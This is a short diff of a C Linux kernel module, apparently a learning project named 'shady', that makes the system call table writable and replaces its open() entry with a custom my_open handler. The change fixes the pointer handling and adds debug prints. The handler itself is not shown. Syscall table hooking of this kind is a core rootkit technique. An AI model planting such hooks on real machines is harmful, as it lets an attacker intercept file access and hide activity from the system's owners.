@@ -232,23 +232,18 @@ shady_init_module(void)
   int i = 0;
   int devices_to_destroy = 0;
   dev_t dev = 0;
-  int* oldOpenFunctionPointer;
-
+  int oldOpenPointer;
+ 
   set_addr_rw(system_call_table_address);
 
-  // asmlinkage int (*old_open) (const char*, int, int);
-  // static int system_call_table_address = 0xc15a8618;
+  oldOpenPointer = system_call_table_address + 20;
+  printk("Old Open Pointer is located at: %x\n", oldOpenPointer);
+  old_open = (void*) *(int*)oldOpenPointer;
+  printk("Old Open Pointer points to    : %x\n", (int)old_open);
+  *(int*)oldOpenPointer = (int)my_open;
+  printk("Open pointer now points to    : %x\n", *(int*)oldOpenPointer);
+  
 
-  // The pointer to the old open function.
-  oldOpenFunctionPointer = (void*)((char*)system_call_table_address + 20);
-  old_open = (void*)oldOpenFunctionPointer;
-  printk("Address of old_open pointer is: %x\n", (int)old_open);
-  printk("Address of my_open is:          %x\n", (int)my_open);
-
-  // Update the open call to point to my_open
-  *oldOpenFunctionPointer = (int)my_open;
-
-  printk("Now open calls function at    : %x\n", (int)(*oldOpenFunctionPointer));
 
   
 	
